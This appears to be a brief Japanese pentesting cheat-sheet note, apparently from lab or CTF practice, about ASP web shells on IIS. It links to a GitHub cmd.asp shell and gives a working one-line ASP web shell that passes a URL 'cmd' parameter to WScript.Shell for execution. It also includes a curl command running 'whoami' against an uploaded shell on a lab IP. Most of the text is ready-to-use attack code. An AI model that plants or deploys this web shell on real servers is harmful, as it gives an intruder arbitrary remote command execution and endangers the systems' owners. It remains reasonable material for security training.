# webshell

[toc]

## ASP

### 画面あり

* https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp![image-20230501095556871](img/webshell/image-20230501095556871.png)* IISのバージョンによっては、以下のエラーになる。![image-20230501095627680](img/webshell/image-20230501095627680.png)

そしたら以下を使う

### 画面なし

```asp
# asp.simple.revs

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

UIはないので直接ブラウザのURL叩くか、curlする

```
curl http://10.129.33.253/upload/cmd.asp?cmd=whoami
```

